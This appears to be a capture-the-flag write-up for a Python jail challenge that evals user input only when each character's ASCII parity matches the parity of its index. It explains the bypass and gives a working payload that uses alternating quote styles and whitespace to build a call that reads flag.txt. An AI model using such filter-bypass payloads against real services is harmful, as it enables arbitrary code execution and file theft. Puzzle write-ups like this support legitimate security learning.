# parity 1

## Challenge Code
```py
inp = input("> ")

for i, v in enumerate(inp):
    if not (ord(v) < 128 and i % 2 == ord(v) % 2):
        print('bad')
        exit()

eval(inp)
```

## Objective

Send input to read the contents of `flag.txt` while adhering to the server's input validation rules.

## Observations

- The server passes our input to `eval`, meaning we can potentially execute arbitrary Python code to print the flag.
- However, the server only accepts input where **the parity of each ASCII character matches the parity of its index**. In other words, characters at *even* indices must have *even* [ASCII values](https://www.asciitable.com/), and characters at *odd* indices must have *odd* ASCII values.
- Therefore, our final payload must be valid Python code and also adhere to these constraints.

## Solution

1. The obvious approach is to try `print(open("flag.txt").read())`. However, this fails the parity check:
    1. `p` is at index 0 (even) and has an ASCII value of 112 (even), which is valid.
    2. `r` is at index 1 (odd) and has an ASCII value of 114 (even), which is invalid.

2. We can work around these limitations by encoding our payload character-by-character in a way which preserves the correct parity. Spelled normally (and contiguously), words like `read` and `print` violate the parity rule, but we can build these words more dynamically (and in a way which preserves parity) using a combination of quoting styles and whitespace.
    1. Notice that `"` has even parity and `'` has odd parity. This allows us to surround any other character with "valid" quotes.
    2. The `space` and `tab` characters also have even and odd parity, respectively, which.
    3. The final payload calls `eval` again (which itself follows the alternating parity rules) to execute the constructed command.

## Payload

The tab characters aren't perfectly replicated here in markdown, but this is the general payload:
```
 eval    (     'p' + 'r' +     "i"     + 'n' + 't' + '(' +     "o"     + 'p' +     "e"     + 'n' + '(' + '"' + 'f' + 'l' +     "a"     +     "g"     + '.' + 't' + 'x' + 't' + '"' +     ")"     + '.' + 'r' +     "e"     +     "a"     + 'd' + '(' +     ")"     +     ")")
```

## Flag

`jail{parity_41f5812e8c0cd9}`
